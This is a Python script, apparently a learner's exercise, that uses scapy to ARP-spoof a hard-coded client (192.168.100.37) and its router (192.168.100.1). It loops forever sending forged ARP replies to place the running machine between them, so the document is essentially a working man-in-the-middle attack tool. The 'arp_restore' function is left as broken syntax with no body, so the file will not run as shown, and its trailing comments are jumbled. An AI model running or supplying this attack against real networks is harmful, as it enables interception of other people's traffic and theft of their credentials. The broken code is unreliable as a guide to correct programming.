#!/usr/bin/env python

import scapy.all as scapy
import time

# Fetching mac address and and returning back to the variable
def fetch_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return response_list[0][1].hwsrc

# Spoofing functionality
def spoofing(target_ip, spoof_ip):
    target_mac = fetch_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restoring ARP tables
def arp_restore:
    
# To initialize the number of packets send
packet_count = 0
# To continue the spoofing packets
try:
    while True:
        spoofing("192.168.100.37", "192.168.100.1") # will spoof the client by telling that i am the router
        spoofing("192.168.100.1", "192.168.100.37") # will spoof the router by telling i am the client
        packet_count = packet_count + 2
        print("\r[+] Packet Sent Successfully: " + str(packet_count), end=""),
        time.sleep(2) # will sleep for 2 sec. In order to not send to many packets
except KeyboardInterrupt:
    print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Quiting")

# Use the below functions in case if it doesn't work using the end function in line 28 via python3
# sys.stdout.flush()
# import sys